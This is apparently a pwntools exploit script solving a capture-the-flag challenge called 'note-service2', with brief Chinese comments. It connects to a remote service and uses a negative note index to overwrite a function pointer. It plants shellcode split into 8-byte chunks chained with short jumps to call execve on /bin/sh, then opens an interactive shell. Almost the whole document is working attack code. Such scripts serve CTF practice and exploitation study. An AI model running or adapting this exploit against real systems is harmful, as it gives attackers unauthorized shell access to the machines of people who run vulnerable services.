#coding:utf8
from pwn import *
context.arch = "amd64"
context(log_level='debug',terminal=["tmux","splitw","-h"])

p = process("./note-service2")
p = remote("220.249.52.133",46411)

def add(index,content):
    p.recvuntil("your choice>>")
    p.sendline("1")
    p.recvuntil("index:")
    p.sendline(str(index))
    p.recvuntil("size:")
    p.sendline("8")  #全部申请为最大堆块8字节
    p.recvuntil("content:")
    p.sendline(content)

def dele(index):
    p.recvuntil("your choice>>")
    p.sendline("4")
    p.recvuntil("index:")
    p.sendline(str(index))

add(0,"/bin/sh")
add(-17,asm("xor rsi,rsi")+"\x90\x90\xeb\x19") #0x90即nop ；EB即 jmp short
add(1,asm("mov eax, 0x3b")+"\xeb\x19")
add(2,asm("xor rdx, rdx")+"\x90\x90\xeb\x19")
add(3,asm("syscall").ljust(7,"\x90"))
# gdb.attach(p)
dele(0)

p.interactive()
p.close()
